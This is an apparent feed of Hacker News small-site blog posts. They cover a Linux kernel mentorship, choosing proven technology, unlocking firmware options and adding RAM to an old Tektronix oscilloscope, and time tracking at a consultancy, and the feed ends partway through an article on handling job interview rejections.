Now the wrapper functions take memory flags as arguments preventing
mentees like me from repeating such blunders.</p><p>I
continued the follow-up work by investigating drivers/usb/serial/
files. I noticed that many usages of usb_control_msg() rely on its
return value of the number of bytes read/wrote. And the new wrapper
functions don’t retain that information. So I had a discussion with
the mentor about if that information was really necessary. We
concluded that it is almost always unnecessary, and having an error
code returned is a better way.</p><p>I
ended up submitting 19 patches as part of the mentorship program. The
first one is a fix for the usb_control_msg() short read bug. The next
three are cleanup patches for usb_control_msg() wrapper functions for
drivers/net/usb files, which were rejected because of the memory flag
blunder. And the remaining 15 are usb_control_msg() cleanup patches
for drivers/usb/serial/ files. Greg KH has reviewed them, but they
are not yet merged in the mainline.</p><p>Apart
from the bug fixing, I also learned few other interesting things
about the Linux kernel and its developer community, like how we test
various changes in the kernel and why we strictly use plain text
emails. I also attended talks at the Linux Plumber’s Conference and
the Open Source Summit Europe during the mentorship, which helped me
catch up with what is happening in the kernel world, learn new
things, and make new connections.</p><p>
My
mentorship program experience has been fantastic, and I recommend it
to everyone interested in pursuing Linux kernel development and
looking for mentoring. I am heartily thankful to my mentor Greg KH,
Shuah Khan, and The Linux Foundation, for providing me with this
opportunity and a great learning experience. 
</p><p>Patches can be found on&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flore.kernel.org%2Flkml%2F%3Fq%3Dhimadrispandya&amp;t=NWJjMDdkODFiMDQ5NzViNjlkNWQyOWI4OGYwNzkyYTRmNTUwMzQ0MCxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605414214" target="_blank"> https://lore.kernel.org/lkml/?q=himadrispandya.<br></a></p>
                    </article></div>]]>
            </description>
            <link>https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057256</guid>
            <pubDate>Wed, 11 Nov 2020 10:41:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Choosing Boring Tech]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057240">thread link</a>) | @amzans
<br/>
November 11, 2020 | https://panelbear.com/blog/boring-tech/ | <a href="https://web.archive.org/web/*/https://panelbear.com/blog/boring-tech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Over the years I have observed that many engineers tend to attribute much of the success or failure of a company to the technical choices made. I know I’m often guilty of this too. And while it is often justified, I would argue that for the vast majority of startups out there, the choice of programming language, framework, or even database doesn’t matter that much. This seems especially true during the early stages.</p><h2>Through the engineering lens</h2><p>This perception is understandable, we as engineers tend to look at the world from a specific lens, and are often biased by what we know best. Our daily activities may include things such as debugging CI pipelines, implementing new features, pairing with colleagues, or migrating the always present legacy codebase. The environment that surrounds us makes it easy to believe that it all boils down to those things that we see and understand. It’s an illusion that makes us feel like we’re fully in control of what makes or breaks the product.</p><p>Don’t get me wrong, it can be a huge advantage for many companies to make their product 3x more efficient than competitors, or to have elegant, composable code. But you might be focusing on the wrong problems if nobody cares about the product you’re actually building, and sooner or later your business will hit this wall.</p><p>I’m not saying that software doesn’t matter. A solid foundation for your startup goes a long way. If investing in this allows you to build better features faster than your competitors, more power to you. But finding the right balance is highly dependent on what you’re trying to solve and the resources you have at hand. There’s no right or wrong way to do it, and as usual, it mainly comes down to tradeoffs.</p><p><img src="https://panelbear.com/static/img/blog/lenses.png" alt="Different lenses"></p><h2>Boring makes me happy</h2><p>I believe aiming for a healthy balance of risk vs reward when it comes to your technical choices is something to strive for. In particular, if it decreases the chances you get stuck on the wrong problems down the road.</p><p>This is why I have come to appreciate ideas such as <a href="https://mcfunley.com/choose-boring-technology">Choose Boring Technology</a>. This is often interpreted as “picking old technologies over newer ones”, but it doesn’t necessarily mean that. For me, this comes down to using proven technologies in which the ways it can fail are mostly known, but occasionally experimenting with different, possibly newer tools that might suit me better.</p><p>Maybe you want to gain more experience by using the latest framework or programming language, or you just want to have some fun. You do what makes you happy. But if you’re trying to make a decision to increase the odds that your product or business will succeed, it’s worth stepping back and considering your options.</p><p>For me, mainly choosing software that has been around for longer is not about it being boring or older, it’s about the fact that the ways in which it fails are better known. There are fewer unknowns for you to deal with and this maximizes your chances of actually shipping the project.</p><p>For example the other day I had an issue with my Django app, and a quick search led me to tens of answers to this problem in various forums and websites. It took me at most 10 minutes to get back on track and that was the end of this issue.</p><p>I experienced the exact opposite a few years ago with a popular, but not so battle-tested Scala library my team had been using for a while. We were probably among the first to encounter the issues we were facing, and it seemed nobody had walked down this path before. Maybe it sounds like a fun challenge or a great chance to contribute back to OSS (which I’m happy to), but once you solve it, do your customers really care about it? How many days, weeks, or even months are you willing to invest in such issues? In my case, I’d rather use that time to ship new features or improve the existing ones.</p><h2>Proven tech vs new tools</h2><p>I try to follow an 80/20 distribution when it comes to my choice of tools. This means my stack consists of about 80% software I already know well, but I do allow myself 20% of the stack to explore tech I have less experience with. The exact ratio is not what’s important here, it’s more the fact that you should lean towards using proven technologies.</p><p>This also resonates with how <a href="https://en.wikipedia.org/wiki/Multi-armed_bandit">Multi-armed bandits</a> work. You try to maximize your expected gain by taking advantage of what worked well in the past, while sometimes exploring new things to avoid missing out on a possible goldmine.</p><p><img src="https://panelbear.com/static/img/blog/bandits.png" alt="Balance new vs proven"></p><p>A more recent example of mine is <a href="https://panelbear.com/">Panelbear</a>, it started as an embarrassingly simple Django app with no charts, all metrics were rendered on a plain HTML table, and all data was stored on a SQLite database. Took literally a weekend to get it up and running including manually deploying to a $5/mo VM. Low risk and high reward for my needs at the time.</p><p>Fast forward and as I added more features and began handling more page views for various websites, I started to notice that the codebase could use some refactoring. It also became increasingly repetitive to do things like deploying to new instances, issuing SSL certs, and keeping the DNS records up to date in case the IP address of my instances changed.</p><p>As a second iteration, I upgraded to a docker-compose setup plus lots of glue code. But soon enough I found myself reinventing what other tools already do well. There are multiple ways to solve each of these pain points, but in my case, it came down to using a tool I am very familiar with from my full-time job: Kubernetes.</p><p>Yes, I am well aware Kubernetes is an absolute overkill for a lot of projects out there, and I could have gotten away with a more traditional solution. But it allowed me to simplify the operational aspects tremendously, and I feel comfortable working with it after having the pleasure of putting down multiple production fires for my employer over the years. That’s why I wouldn’t bindly recommend it to everyone. Do what you know best.
As an added benefit, it also made it trivial when I migrated from DigitalOcean to Linode, and most recently to AWS (each migration took mostly an evening of changing my Terraform files and deploying them - I’m being serious). But that’s for another post.</p><p>Another case in which it paid off once again, was when I wanted to experiment with using Clickhouse for data ingestion and the aggregation queries. It took me less than 10 minutes to write a basic deployment manifest and have it up and running. This included automated SSL certs, in-cluster service discovery, and unified logging/monitoring out of the box. It was a huge win since it allowed me to try things out faster than before.</p><p>Even better, I can deploy any container and operate it the exact same way as I deploy anything else on my cluster. Need more volume storage with zero downtime? It’s a simple manifest change, commit and deploy. Same thing when I needed Redis for caching, I was up and running in minutes, without increasing my costs or adding operational complexity.</p><h2>Focus on shipping</h2><p>My point is, I moved into these technologies as the pain with the previous solution was higher than dealing with the new tech. But more importantly, it helped me ship features even faster to my customers while reducing the operational overhead for me.</p><p>If I had started with the more advanced setup from day one, I might have lost all motivation before I would have had the first version of Panelbear. The key is to solve the problems that are getting between you and your goals, not potential issues you believe one day will be yours.</p><p>Hope you enjoyed this blog post. I plan on writing more about Panelbear’s tech stack, and lessons learned along the way. So stay tuned!</p></div></div></div>]]>
            </description>
            <link>https://panelbear.com/blog/boring-tech/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057240</guid>
            <pubDate>Wed, 11 Nov 2020 10:37:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Option Hacking the Tektronix TDS 420A]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25057162">thread link</a>) | @segfaultbuserr
<br/>
November 11, 2020 | https://tomverbeure.github.io/2020/07/11/Option-Hacking-the-Tektronix-TDS-420A.html | <a href="https://web.archive.org/web/*/https://tomverbeure.github.io/2020/07/11/Option-Hacking-the-Tektronix-TDS-420A.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Previous installments in this series: <a href="https://tomverbeure.github.io/2020/06/27/In-the-Lab-Tektronix-TDS420A.html">In the Lab - Tektronix TDS 420A Oscilloscope</a>, 
 <a href="https://tomverbeure.github.io/2020/06/27/Tektronix-TDS420A-Remote-Control-over-GPIB.html">Tektronix TDS 420A Remote Control over GPIB</a>, 
 <a href="https://tomverbeure.github.io/2020/07/02/Extracting-the-Tektronix-TDS420A-Firmware.html">Extracting the Tektronix TDS 420A Firmware</a>, 
 <a href="https://tomverbeure.github.io/2020/07/03/TDS420A-Serial-Debug-Console-Symbol-Table-Ghidra.html">A Tektronix TDS 420A, a Serial Debug Console, a Symbol Table, and Ghidra</a></em></p>

<ul id="markdown-toc">
  <li><a href="#introduction" id="markdown-toc-introduction">Introduction</a></li>
  <li><a href="#how-a-tds400-oscilloscope-manages-hardware-features" id="markdown-toc-how-a-tds400-oscilloscope-manages-hardware-features">How a TDS400 Oscilloscope Manages Hardware Features</a></li>
  <li><a href="#the-key-to-enabling-option-05---video-triggering" id="markdown-toc-the-key-to-enabling-option-05---video-triggering">The Key to Enabling Option 05 - Video Triggering</a></li>
  <li><a href="#the-key-to-enabling-option-2f---advanced-dsp-math" id="markdown-toc-the-key-to-enabling-option-2f---advanced-dsp-math">The Key to Enabling Option 2F - Advanced DSP Math</a></li>
  <li><a href="#options-05-and-2f-enabled" id="markdown-toc-options-05-and-2f-enabled">Options 05 and 2F Enabled!</a></li>
  <li><a href="#option-1m---120k-sample-points---a-different-story" id="markdown-toc-option-1m---120k-sample-points---a-different-story">Option 1M - 120K Sample Points - A Different Story</a></li>
  <li><a href="#in-search-of-the-missing-memory" id="markdown-toc-in-search-of-the-missing-memory">In Search of the Missing Memory</a></li>
  <li><a href="#success-at-last" id="markdown-toc-success-at-last">Success at Last!</a></li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
  <li><a href="#references" id="markdown-toc-references">References</a></li>
</ul>



<p>I wrote <a href="https://tomverbeure.github.io/2020/06/27/In-the-Lab-Tektronix-TDS420A.html#the-tektronix-tds-420a-in-brief">earlier</a>
about the optional features of TDS 400 series of oscilloscopes:</p>

<ul>
  <li>Option 05: Video Trigger</li>
  <li>Option 13: RS-232/Centronics Hardcopy Interface</li>
  <li>Option 1F: File System/Floppy</li>
  <li>Option 2F: Advanced DSP Math</li>
  <li>Option 1M: 120k waveform sample points</li>
</ul>

<p>Most scopes, including mine, come with options 13 and 1F, but the remaining ones are less common.</p>

<p>The video triggering and advanced DSP math options are pure firmware functions, but even 
the 120k sample points option seemed like something that could be enabled with a software hack, since
the signal acquisition board has the 512KB of RAM available to store the data.</p>

<p>Here, I’ll describe how the TDS 400 series manages option enablement, and
how you can hack the scope into getting them to work.</p>



<p>Using Ghidra and the debug console, I figured out how the scope manages hardware
features: it has a function called <code>hwAccountantQuery</code> that has a single
parameter which I’ll call the ‘feature ID’.</p>

<p><code>hwAccountantQuery</code> will return an integer value for that feature ID. These values
can be boolean in nature (“Is a certain feature present or not”) or can be the
amount of DSP memory etc.</p>

<p>Here’s a very non-exhaustive list of codes that I’ve been able to identify:</p>

<div><div><pre><code>0x20d: number of scope channels
0x20f: size of acquisition RAM
0x216: ProbeD2MemSize
0x248: CPU clock period
0x255: InstrumentNameStringPtr
0x271: hwProbeSpecialDiagModeActive
0x2a0: hwProbeSpecialDiagLoopCount
0x2a1: hwProbeSpecialDaigSeqId
0x2b8: 30000 points -&gt; value when 1M option is not possible
0x2bf: TDS420A
0x2d2: RS232 Debug uart present
0x317: MathPak      -&gt; this is the advanced DSP math function
0x461: Floppy drive present
0x537: flashRomDateStringPtr
0x54c: TDS410A
0x560: TDS430A
0x700: hwProbeTvTrigPresent
</code></pre></div></div>

<p><code>hwAccountantQuery</code> calls <code>hwAccountantGetValue</code>. The first part of that function looks liks this:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwAccountantGetValue.png" alt="hwAccountantGetValue"></p>

<p>It’s a large <code>if-then-else</code> or <code>case</code> statement that calls a dedicated function for a particular
feature ID.</p>



<p>Did you see <code>_hwProbeTvTrigPresent()</code>? That’s the function that checks
if the video triggering feature should be enabled:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwProbeTvTrigPresent.png" alt="hwProbeTvTrigPresent"></p>

<p>And there we have it! To enable “Option 05 - Video Triggering”, all you need to do
is store a non-zero value in non-volatile RAM location 7!</p>

<p><em>This is not a shocking new discovery: plenty of online sources already mentioned this,
but it’s great to confirm it from first principles, by going to the source.</em></p>



<p>Internally, the Advanced Math DSP is called “MathPak”. Just like for video triggering, 
the <code>hwAccountGetValue</code> function issues a call to <code>hwProbeMathPakPresent()</code>:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwProbeMathPakPresent.png" alt="hwProbeMathPakPresent"></p>

<p>Option 2F simply relies on a non-zero value in NVRAM location 9!</p>



<p>It’s now just a matter of issuing the following 2 commands on the debug console:</p>

<div><div><pre><code>libManagerWordAtPut 0x50007, 1
libManagerWordAtPut 0x50009, 1
</code></pre></div></div>

<p>My scope booted up with this image:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/options_05_and_2f_enabled.jpg" alt="Options 05 and 2F enabled"></p>

<p>Success! I’m now the proud owner of a scope that supports an entirely obsolete video triggering
mode, and a FFT math option!</p>

<p>Video Triggering Menu:
<img src="https://tomverbeure.github.io/assets/tds420a/video_triggering_features.jpg" alt="Video triggering features"></p>

<p>Live FFT of a 1kHz square wave:
<img src="https://tomverbeure.github.io/assets/tds420a/fft.jpg" alt="FFT"></p>



<p>Unfortunately, the <code>case</code> statement is only a small part of the <code>hwAccountGetValue</code> function: most
feature checking functions are performed by looping through an array of structs that
have the feature ID and a function pointer to the checking function. It’s a bit harder to figure 
out in Ghidra, but we already know that the function names to enable options start with <code>hwProbe</code>.</p>

<p>With Ghidra, we can filter on this, and that gives the <code>hwProbe1MOption</code> and the 
<code>hwProbe1MPresent</code> functions.</p>

<p><code>hwProbe1MPresent</code> looks very familiar:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwProbe1MPresent.png" alt="hwProbe1MPresent"></p>

<p>Just like for the 05 and 2F options, we need to set a specific byte in the
NVRAM:</p>

<div><div><pre><code>libManagerWordAtPut 0x50006, 1
</code></pre></div></div>

<p><code>hwProbe1MOption</code> is a different story:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwProbe1MOption.png" alt="hwProbe1MOption"></p>

<p>When you run <code>hwProbe1MOption</code> on the command line, the function returns a 0.</p>

<p>Feature IDs 0x216 and 0x20f are also part of the array of structs. They call the functions
<code>hwProbeD2MemSize</code> and <code>hwProbeAcqMemSize</code> respectively.</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/hwProbeTable.png" alt="hwProbe table"></p>

<p><code>hwProbeD2MemSize</code> and <code>hwProbeAcqMemSize</code> both run a test to check the amount of RAM that 
is populated on the board.</p>

<p>When you run these query commands on the debug console, you get:</p>

<div><div><pre><code>hwAccountantQuery(0x216)    
262143
hwAccountantQuery(0x20f)    
131071
</code></pre></div></div>

<p>It’s now clear why option 1M doesn’t get enabled after changing the NVRAM value: 
feature ID 0x20f is fine (131071/0x1ffff is larger than 0x1fffe), but feature ID 0x216 is not 
(262143/0x3ffff is smaller than 0xffffe).</p>

<p>Whatever it is used for, the amount of “D2” memory in the scope is too small.</p>



<p>This finally gave me the crucial hint to start looking at other PCBs inside the scope and
try to find if there’s a place with empty footprints for RAM chips.</p>

<p>I call this the DSP PCB. Luckily, it’s a board that’s easy to remove from the chassis, without 
fragile flex cables or connectors.</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/dsp_pcb.jpg" alt="DSP PCB"></p>

<p>Look at those 6 beautiful, unused footprints!</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/ram_footprints_closeup.jpg" alt="RAM footprints closeup"></p>

<p>The RAM chips are M5M51008 with a 100ns speed rating, made by Mitsubishi LSI.</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/memory_datasheet.jpg" alt="Memory Datasheet"></p>

<p>Surprisingly, Digikey still carries these parts: they’re now made by Rochester
Electronics, and only available in 70ns or 55ns version, but faster is better,
so that shouldn’t be a problem.</p>

<p>They’re cheap too at just $2.56 a piece.</p>

<p>The only issue is a minimum order quantity of 100 parts. $256 for a feature
on a 25 years old $190 oscilloscope is a bit too much! Luckily, the parts
are available at various Chinese chip brokers: I was able to buy them at 
<a href="https://utsource.net/">UTSource</a> for just $1.81 a piece. Even when buying 10 
of them (for redundancy), shipping was the biggest part of the cost:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/memory_order.png" alt="Memory Order"></p>

<p><em>Once ordered, UTSource let me know that these parts were refurbished…</em></p>

<p>A few days later, the parts arrived at my front door, ready to be populated
on the DSP board:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/dsp_board_before_surgery.jpg" alt="DSP Board Before Surgery"></p>

<p>Note how I did not disconnect the battery that’s wired to the board: it’s used to
permanently provide power to those 4 RAMs chips on the left that are encased into 
some transparant polymer gu. Removing the battery will result in lost calibration
data (or so they say.)</p>

<p>I used a regular soldering iron instead of a hot air gun to attach the 6 RAMs:
there was enough solder on the pads and I’m most comfortable doing it that way.
Afterwards I Ohm’ed out most of the pins, and I’m glad I did because
there were some open connections.</p>

<p>The end result isn’t perfect, but it’s good enough:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/rams_populated.jpg" alt="RAMs Populated"></p>



<p>With the RAM populated, it’s time to power on the scope and check the result
of the enhancement surgery!</p>

<p>The scope bootup screen looks good:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/option_1m_enabled.jpg" alt="Option 1M enabled"></p>

<p>And this formerly grayed out 12000 points menu option is now available:</p>

<p><img src="https://tomverbeure.github.io/assets/tds420a/120k_points.jpg" alt="120K Points"></p>

<p>Victory at Last!</p>



<p>The TDS 420A is an old oscilloscope, and even with those 3 new options enabled, it’s
far inferior to my Siglent 2304X or even my HP 54825A (Windows 95!) loaner.</p>

<p>120K sample points is obviously better than 30K, but it still pales in comparison
to the 140M sample points of the Siglent.</p>

<p>So what then was the point of this whole exercise?</p>

<p>I got a close up view of oscilloscope internals, I learned Ghidra from scratch and
applied it on a real, non-trival project, I added RAM to a 25 year old oscilloscope 
and it worked, I spent tons of late night hours decoding firmware, and 
I had an unreasonable amount of fun doing so.</p>

<p>I even started to appreciate the Tektronix user interface a little bit!</p>

<p>It was time well spent.</p>

<p>For now, the scope will remain on my bench while I start adding Tektronix support 
in glscopeclient. That was the whole point of acquiring the scope to being with!</p>

<p>And if it turns out that it’s really too limited for my use, I can always
sell it back on eBay, this time with 3 additional features enabled.</p>



<ul>
  <li>
    <p><a href="https://www.eevblog.com/forum/testgear/hacking-my-tds460a-to-have-options-1m2f/">Hacking my TDS460A to have options 1M/2F?</a></p>
  </li>
  <li>
    <p><a href="https://forum.tek.com/viewtopic.php?t=140268">TDS420 Options Possible?</a></p>
  </li>
  <li>
    <p><a href="http://videohifi17.rssing.com/chan-62314146/all_p49.html">Upgrade Tektronix: FFT analyzer</a></p>

    <p>Story about upgrading the CPU board from 8MB to 16MB on a TDS420 (not the 420A?) and then FFT in the
  NVRAM.</p>
  </li>
  <li>
    <p><a href="https://www.youtube.com/watch?v=iJt2O5zaLRE">Enabling FFT option in Tektronix TDS 540A oscilloscope</a></p>

    <p>Not very useful for 420A owners: enables FFT by copying NVRAM EEPROM.</p>
  </li>
  <li>
    <p><a href="https://www.eevblog.com/forum/testgear/tds420-with-lost-options/msg2032465/?PHPSESSID=021nnvu02ca549sh5le7s9r8i5#msg2032465">TDS420 with lost options</a></p>

    <p>Specific comment about how to enable options on the 420A over GPIB. I wasn’t able to get this to 
  work for some reason.</p>
  </li>
  <li>
    <p><a href="http://www.ko4bb.com/getsimple/index.php?id=enable-tds754d-options">Enable TDS754D Options using GPIB</a></p>

    <p>Another one about using GPIB.</p>
  </li>
</ul>


  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://tomverbeure.github.io/2020/07/11/Option-Hacking-the-Tektronix-TDS-420A.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057162</guid>
            <pubDate>Wed, 11 Nov 2020 10:22:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Time Tracking]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057142">thread link</a>) | @hanspagel
<br/>
November 11, 2020 | https://blog.ueber.io/post/time-tracking/ | <a href="https://web.archive.org/web/*/https://blog.ueber.io/post/time-tracking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Our whole company is based on time tracking. While we can understand the love-hate relationship many people have with it, you shouldn’t overlook the benefits. Let’s go through a few things we learned about time tracking and how we make it less scary.</p>
<h2 id="the-benefits-of-tracking-time">The benefits of tracking time</h2>
<p>First of all, we think that time is the most precious thing we all have, so that’s what we sell. Clients trustfully hire us to work with them for a certain amount of days, giving the best we can during that time. We promise to focus entirely on our client’s projects and do the thing we can do best.</p>
<p>That also means no one is paying more hours than we work, and no one is paying fewer hours than we did. If we’re pretty fast together, that’s a win for both of us. If you’re adding more and more requirements to the feature, you’ll get more, also pay more in the end, and it’s also a win for both sides. That’s the fairest it can get.</p>
<p>That makes writing offers and invoices easier, too. Why should we waste time negotiating a price with you? It’s not what we are good at, and it’s nothing anybody benefits from. <a href="https://blog.ueber.io/post/fixed-budgets">Our offers have a recommended amount of days we need to work together to help you the best.</a> Our invoices are a monthly sum of tracked hours, roughly the amount in our offers. Or it’s less if we didn’t work as much as we expected, or more if there was more to do a particular month.</p>
<p>Also, that’s fully transparent for everyone. We can warn our clients upfront if we’re going to need more time and leave the decision to them.</p>
<p>Most of our invoices only include the sum of hours and a list of things achieved in that time. If someone asks, we also attach a detailed time tracking report. From our experience, clients who ask for that level of transparency have trust issues anyway, and we can’t build up trust from that alone, so there’s probably some more serious issues behind that question.</p>
<p>Most people here work from their home office, and so a lot happens without everyone knowing it, but the sum of tracked hours per project gives a good glimpse over what happens in the company. Note that there is a big assumption in it, which probably doesn’t work for every team. We assume if people spend time on a project, they move it forward. If we want to move a project forward quicker, it’s often enough <a href="https://blog.ueber.io/post/the-schedule">to schedule more time of one or two project members for those projects for the upcoming months</a>.</p>
<h2 id="without-tracking-time">Without tracking time</h2>
<p>Sure, it’s great not having to press a button before and after work. But, that can be very dangerous in many regards, especially for creative work.</p>
<p>I don’t know about you, but we forget about time when we’re in a flow state and deeply concentrated. There is no chance I could tell you if I was working one or four hours on a problem at the end of a day, or I could know if I was working 50 or 100 hours on a specific project at the end of the month.</p>
<p>Though, I like to look up how much I worked over the week on a Friday evening. A lot of hours can be a sign of a lot of uninterrupted work, which’s a good thing.</p>
<p>We even feel it protects us from doing more or less than we get paid. Both could be bad for a calm working environment, where you don’t want to do extra hours (stress!) and don’t want to slack around too much in between projects (procrastination leads to stress).</p>
<h2 id="how-we-do-it">How we do it</h2>
<p><a href="https://blog.ueber.io/post/tools">We use Toggl Track for a few years now</a>, but you can use whatever you like. It’s a service that everyone in the team has access to, has a big start/stop button, and a description field. That’s it.</p>
<p>By the way, some tools offer automatic time tracking, which checks what app you’re running for how long. If you struggle to build the habit of tracking the time, that’s probably a better start.</p>
<p>When you’re ready to work on a project, start by clicking the start button. When you’re finished, hit stop. There is no need to stop the tracking if you’re away from the keyboard for a few minutes. Only pause the timer if you’re about to take your lunch break, any other kind of long pause, or to switch to a different project (which we try to avoid).</p>
<p>For most projects, it’s enough to attach the entry to that project and roughly describe in few words what you’re doing, for example, “Designing wireframes”. There is no need to get too specific here and mention single tasks or anything like that.</p>
<h2 id="what-were-tracking">What we’re tracking</h2>
<p>Our whole billing bases on time tracking, so it’s essential to track clients’ work, including everything you need to advance the project. For example, when you’re designing, developing, thinking, doing research, or experiments.</p>
<p>Besides that, we also expect people to track internal projects (I’m tracking time on “Blog” right now), and we have a lot of them. For example, our website, <a href="https://blog.ueber.io/post/list-of-side-projects">all of our self-initiated projects</a>, a sustainability project, social engagement projects, and many more.</p>
<p><a href="https://blog.ueber.io/post/keep-learning">Every team member needs time to learn</a>, so we schedule days to do just that. We ask people to track that too. Learning doesn’t produce a tangible outcome, so the tracked time can be a great indicator if there was enough time to learn over the year.</p>
<h2 id="dont-track-that">Don’t track that</h2>
<p>We don’t track other things, like socializing, watching a video between tasks, or other smaller breaks. We all need those, especially while doing creative work.</p>
<p>Also, we don’t expect anyone to get to the amount of time in their contract. There are probably many people sitting eight hours a day in front of their screen, but no one works eight hours straight—no need to get to that sum of hours for your working day.</p>
<h2 id="common-pitfalls">Common pitfalls</h2>
<p>We don’t want to sound too optimistic here. Yes, it can be unpleasant to press the start/stop before doing the actual work. All our projects are scheduled based on days, so people only have to press start and stop a few times in an ideal week. From our experience adding descriptions can feel tedious, too. For example, as I’ve already said, “developing the backend” is eloquent enough in most cases.</p>
<p>If you expect to track your whole day, that’s going to be disappointing, too. We don’t get tired to repeat it:</p>
<p>No one works eight hours straight. A day with four to six hours of tracked time has probably been a great day with plenty of uninterrupted work. We consider that a huge success already. There is no need to get to eight hours per day (or whatever your contract says).</p>
<p>Oh, and yes, we don’t confuse the tracked time with “performance” or take it as a metric of success for a single team member or us as a company. Tracking more time doesn’t make you or us more productive per se. We try to keep it fair for everyone. For you, for the whole team, and our clients, that’s all.</p>
<h2 id="your-experience">Your experience</h2>
<p>What’s your experience with time tracking? Is there anything that annoys you? Do you have an idea of how it can get more comfortable? <a href="https://twitter.com/hanspagel/status/1326468288201826305" target="_blank" rel="nofollow noopener noreferrer">Share it with us on Twitter!</a></p>
</section></div>]]>
            </description>
            <link>https://blog.ueber.io/post/time-tracking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057142</guid>
            <pubDate>Wed, 11 Nov 2020 10:18:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Four Steps to Take After Your Unsuccessful Job Interview]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057115">thread link</a>) | @eisabai
<br/>
November 11, 2020 | https://code.likeagirl.io/four-steps-to-take-after-your-unsuccessful-job-interview-d4e5df344b1a?source=your_stories_page------------------------------------- | <a href="https://web.archive.org/web/*/https://code.likeagirl.io/four-steps-to-take-after-your-unsuccessful-job-interview-d4e5df344b1a?source=your_stories_page-------------------------------------">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="1182">What to do when you’ve failed a job interview</h2><div><div><div><div><a href="https://medium.com/@eisabai?source=post_page-----d4e5df344b1a--------------------------------" rel="noopener"><div><p><img alt="Isabel Nyo" src="https://miro.medium.com/fit/c/96/96/1*BGXgVWhH-nqrX6VruxEvmA.jpeg" width="48" height="48"></p></div></a></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/12032/0*TadXdhbziKwvqTAg" width="6016" height="4016" srcset="https://miro.medium.com/max/552/0*TadXdhbziKwvqTAg 276w, https://miro.medium.com/max/1104/0*TadXdhbziKwvqTAg 552w, https://miro.medium.com/max/1280/0*TadXdhbziKwvqTAg 640w, https://miro.medium.com/max/1400/0*TadXdhbziKwvqTAg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*TadXdhbziKwvqTAg?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@benwhitephotography?utm_source=medium&amp;utm_medium=referral" rel="noopener">Ben White</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><blockquote><p id="b5c7">Dear {Name},</p><p id="03fa">We are sorry to inform you that the decision has been made not to progress with your application for the {role}. I’m sorry it isn’t better news.</p><p id="b9b8">Signed,<br>Recruiter/Hiring Manager</p></blockquote><p id="7790">We have all seen this kind of messages. Unfortunately though, it doesn’t get easier no matter how many times you have seen it.</p><p id="8f61">As someone who has been on the other side of the table many times as an interviewer and have had a good track record when it comes to nailing interviews as an interviewee, I still can’t completely escaped from such rejection messages.</p><p id="98d6">In this article, I’d like to share with you four steps that you can take to still walk away as a winner even after being rejected at an interview.</p></div></div></section><section><div><div><h2 id="f612">1. Obtain as much feedback as possible</h2><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/10368/0*l_fDsPC7ZWbZo-RG" width="5184" height="3456" srcset="https://miro.medium.com/max/552/0*l_fDsPC7ZWbZo-RG 276w, https://miro.medium.com/max/1104/0*l_fDsPC7ZWbZo-RG 552w, https://miro.medium.com/max/1280/0*l_fDsPC7ZWbZo-RG 640w, https://miro.medium.com/max/1400/0*l_fDsPC7ZWbZo-RG 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*l_fDsPC7ZWbZo-RG?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@nshuman1291?utm_source=medium&amp;utm_medium=referral" rel="noopener">Nathaniel Shuman</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="3d09">If you don’t hear from the company a few days or week after your interview or if you receive a generic rejection email, it’s on you to try and obtain as much feedback as possible. Be polite and 